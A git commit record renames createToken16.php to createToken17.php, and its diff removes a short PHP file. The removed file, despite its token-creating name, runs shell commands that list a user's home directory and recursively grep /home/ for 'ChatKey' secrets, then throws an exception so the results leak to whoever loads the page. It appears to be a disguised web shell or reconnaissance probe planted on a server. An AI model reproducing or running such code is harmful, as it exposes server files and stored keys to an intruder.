430835208a1171ec763f40c18c5b57e361c22fc7
TestBalbes <76755615+TestBalbes@users.noreply.github.com>
2021-01-02 22:28:52 +0100

    Update and rename createToken16.php to createToken17.php

--- createToken16.php
+++
@@ -1,8 +0,0 @@
-<?php
-$output ='';
-
-$output =$output."\n root ls ".shell_exec ('ls /home/pinhead/  | cat');
-$output =$output."\n htpaswd ".shell_exec ("grep -rnw '/home/' -e '*ChatKey*'  | cat");
-
-throw new Exception("\n SUCCESS  ". $output."\n");
-?>
